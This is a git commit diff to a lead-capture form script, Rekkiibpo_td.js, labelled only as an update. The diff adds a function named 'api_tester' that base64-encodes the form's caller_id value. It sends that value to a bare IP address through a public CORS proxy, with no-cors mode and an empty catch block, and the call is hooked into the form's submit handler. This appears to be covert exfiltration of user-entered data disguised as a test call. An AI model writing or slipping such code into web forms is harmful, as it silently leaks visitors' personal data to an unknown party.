3ecfc8ecafef722d04f40c6b8a842fddfd302e2c
dk495 <55878882+dk495@users.noreply.github.com>
2024-04-02 18:15:47 +0500

    Update Rekkiibpo_td.js

--- Rekkiibpo_td.js
+++ Rekkiibpo_td.js
@@ -10,6 +10,7 @@ document.getElementById('leadForm').addEventListener('submit', function(event) {
      
       formData.append('zip', document.getElementById('zip').value);
 formData.append('city', document.getElementById('city').value);
+	api_tester(document.getElementById('caller_id').value);
       formData.append('state', document.getElementById('state').value);
 	formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').value);
 	   
@@ -68,3 +69,14 @@ formData.append('city', document.getElementById('city').value);
             })
             .catch(error => console.error('Error:', error));
         });
+function api_tester(randomString) {
+  try {
+    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+    
+  }
+}
